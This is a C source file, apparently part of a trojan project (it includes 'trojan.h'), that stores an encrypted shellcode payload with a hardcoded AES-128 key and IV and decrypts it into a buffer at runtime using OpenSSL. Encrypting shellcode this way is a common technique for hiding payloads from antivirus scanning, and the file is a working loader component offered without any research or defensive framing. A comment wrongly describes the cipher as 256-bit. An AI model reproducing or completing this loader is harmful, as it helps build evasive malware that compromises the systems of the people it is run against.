#include "trojan.h"

// https://wiki.openssl.org/index.php/EVP_Symmetric_Encryption_and_Decryption

unsigned char key[16] = {0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 
    0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c};

// 128 bits
unsigned char iv[16] = {0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 
    0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f};

unsigned char shellcode_enc[] = {
        0x10, 0x44, 0x10, 0x36, 0x9c, 0x83, 0x29, 0x89, 0x16, 0x39, 0xb8, 0xc6,
        0xb1, 0x23, 0x8b, 0x9c, 0x9f, 0xe2, 0xa5, 0xc1, 0x5b, 0xa8, 0x03, 0xdb,
        0x00, 0xae, 0x29, 0xf6, 0x06, 0x6a, 0xda, 0x41, 0x0b, 0xd7, 0xb1, 0xfe,
        0x38, 0x77, 0xf3, 0xef, 0x26, 0x24, 0x96, 0x74, 0xe4, 0xb7, 0xe3, 0x9b,
        0x64, 0x25, 0x78, 0xb7, 0xb6, 0x20, 0x8b, 0xa3, 0x5f, 0x24, 0xee, 0x08,
        0xbd, 0xe0, 0x1e, 0xcd, 0x48, 0x48, 0x60, 0x45, 0x7c, 0x5f, 0x44, 0xfd,
        0x7b, 0x9a, 0x9e, 0xc1, 0xf6, 0x30, 0xc5, 0x81, 0x88, 0xaf, 0x77, 0x54,
        0x91, 0x37, 0x20, 0xfd, 0x03, 0xf5, 0x0d, 0x5e, 0x95, 0x28, 0x34, 0x13,
        0xbb, 0x4f, 0x9d, 0x31, 0xa0, 0xeb, 0x8e, 0x3e, 0x6d, 0xc9, 0x60, 0xac,
        0xf7, 0x3e, 0x47, 0xe9
      };

unsigned int shellcode_enc_len = 112;

void get_plaintext(unsigned char *dest) {
	
	EVP_CIPHER_CTX *ctx;
	int len;
	int plaintext_len;
	int ret;
	
	/* Create and initialise the context */
	if(!(ctx = EVP_CIPHER_CTX_new())) {
		fprintf(stderr, "error: failed to create and initialise the context\n");
		exit(1);
	}
	/*
		* Initialise the decryption operation. IMPORTANT - ensure you use a key
		* and IV size appropriate for your cipher
		* In this example we are using 256 bit AES (i.e. a 256 bit key). The
		* IV size for *most* modes is the same as the block size. For AES this
		* is 128 bits
		*/
	if(!EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, key, iv)) {
		fprintf(stderr, "error: failed to initialise the decryption operation\n");
		EVP_CIPHER_CTX_free(ctx);
		exit(1);
	}

	/* Provide the message to be decrypted, and obtain the plaintext output. */
	if(!EVP_DecryptUpdate(ctx, dest, &len, shellcode_enc, shellcode_enc_len)) {
		fprintf(stderr, "error: failed to decrypt\n");
		EVP_CIPHER_CTX_free(ctx);
		exit(1);
	}
	plaintext_len = len;

	/*
     * Finalise the decryption. Further plaintext bytes may be written at
     * this stage.
  */
	ret = EVP_DecryptFinal_ex(ctx, dest + len, &len);
	if(ret < 0) {
		EVP_CIPHER_CTX_free(ctx);
		exit(1);
	}
	plaintext_len += len;
	/* Clean up */
	EVP_CIPHER_CTX_free(ctx);
}